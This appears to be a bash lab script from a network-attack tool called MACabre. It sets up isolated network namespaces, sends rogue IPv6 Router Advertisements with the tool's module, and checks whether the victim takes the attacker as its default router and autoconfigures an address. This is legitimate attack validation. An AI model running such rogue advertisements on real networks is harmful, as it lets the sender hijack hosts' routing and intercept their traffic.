#!/usr/bin/env bash
# Isolated rogue router advertisement lab (Linux only, needs root and IPv6 in the kernel).
#
# Topology, all inside network namespaces, on one bridge:
#
#   victim:   a host that accepts Router Advertisements (default kernel setting). It has no router.
#   attacker: a host that sends RAs with MACabre's module, announcing itself as a default router for
#             PREFIX, a /64 for SLAAC.
#
# Phases:
#   Phase 1 (control): no RA has been sent. The victim has no default router and no address in PREFIX.
#            If it already has one, the lab cannot tell anything and exits 2.
#   Phase 2 (attack): the attacker sends RAs. The victim must add the attacker's link-local address as
#            its default router, and configure a SLAAC address inside PREFIX.
#
# Exit 0 when the control holds and both results of the attack hold. Exit 1 when either does not hold.
# Exit 2 when the control failed.
#
# Nothing here touches the host's real network interfaces.
#
# Usage:
#   sudo scripts/lab/rogue_router_advertisement_lab.sh
#
# Requirements: iproute2 (ip) with IPv6 enabled in the kernel, and the project virtualenv (.venv).
# Override the interpreter with PYTHON=/path/to/python.

set -euo pipefail

if [[ "$(id -u)" -ne 0 ]]; then
    echo "This lab needs root: run it with sudo." >&2
    exit 1
fi

if ! command -v ip >/dev/null 2>&1; then
    echo "Missing required tool: ip" >&2
    exit 1
fi

if [[ ! -e /proc/sys/net/ipv6 ]]; then
    echo "This lab needs IPv6 in the kernel." >&2
    exit 1
fi

ROOT="$(cd "$(dirname "$0")/../.." && pwd)"
PY="${PYTHON:-$ROOT/.venv/bin/python}"
PREFIX="2001:db8:bad::/64"
PREFIX_BASE="2001:db8:bad:"
ATTACKER_MAC="02:00:00:00:10:03"
ATTACKER_LL="fe80::ff:fe00:1003"       # EUI-64 link-local for ATTACKER_MAC
VICTIM_MAC="02:00:00:00:10:02"

stop_lab() {
    for ns in lan victim attacker; do
        ip netns del "$ns" 2>/dev/null || true
    done
}
trap stop_lab EXIT

stop_lab

ip netns add lan
ip netns add victim
ip netns add attacker

ip netns exec lan ip link add br0 type bridge
ip netns exec lan ip link set br0 up
for pair in "vic:victim:$VICTIM_MAC" "atk:attacker:$ATTACKER_MAC"; do
    IFS=: read -r name ns mac <<<"$pair"
    ip link add "p-$name" type veth peer name "h-$name"
    ip link set "h-$name" netns "$ns"
    ip link set "p-$name" netns lan
    ip netns exec lan ip link set "p-$name" master br0
    ip netns exec lan ip link set "p-$name" up
    ip netns exec "$ns" ip link set "h-$name" address "$mac"
    ip netns exec "$ns" ip link set "h-$name" up
done

SEND_CODE='
import sys, threading
from macabre.attacks.rogue_router_advertisement import RogueRouterAdvertisementConfig, run_rogue_router_advertisement
stats = run_rogue_router_advertisement(
    RogueRouterAdvertisementConfig(iface=sys.argv[1], source_mac=sys.argv[2], prefix=sys.argv[3], frames=3),
    threading.Event(), lambda _s: None,
)
print(stats.frames)
'

# Prints "yes" when the victim has a default route through ATTACKER_LL, otherwise "no".
has_attacker_router() {
    if ip netns exec victim ip -6 route show default 2>/dev/null | grep -q "via $ATTACKER_LL"; then
        echo yes
    else
        echo no
    fi
}

# Prints "yes" when the victim has a global address inside PREFIX, otherwise "no".
has_slaac_address() {
    if ip netns exec victim ip -6 addr show dev h-vic scope global 2>/dev/null | grep -q "inet6 $PREFIX_BASE"; then
        echo yes
    else
        echo no
    fi
}

echo "Phase 1: control, no RA sent"
sleep 2
BASE_ROUTER="$(has_attacker_router)"
BASE_ADDR="$(has_slaac_address)"
echo "  default router via $ATTACKER_LL: $BASE_ROUTER"
echo "  SLAAC address inside $PREFIX: $BASE_ADDR"
echo

echo "Phase 2: attacker sends Router Advertisements for $PREFIX with MACabre's module"
SENT="$(ip netns exec attacker env PYTHONPATH="$ROOT/src" "$PY" -c "$SEND_CODE" h-atk "$ATTACKER_MAC" "$PREFIX" 2>/dev/null || echo 0)"
echo "  advertisements sent: $SENT"
sleep 4
ROUTER="$(has_attacker_router)"
ADDR="$(has_slaac_address)"
echo "  default router via $ATTACKER_LL: $ROUTER"
echo "  SLAAC address inside $PREFIX: $ADDR"
echo

if [[ "$BASE_ROUTER" != "no" || "$BASE_ADDR" != "no" ]]; then
    echo "Control: the victim already had the attacker's router or a prefix address before the attack. Result unreliable."
    exit 2
fi
if [[ "$ROUTER" == "yes" && "$ADDR" == "yes" ]]; then
    echo "Result: the victim added the attacker ($ATTACKER_LL) as its default router and configured a SLAAC address inside $PREFIX. Vulnerable: router advertisements are accepted without authentication."
    exit 0
fi
echo "Result: the victim did not accept the advertisement (router: $ROUTER, address: $ADDR). Not validated."
exit 1
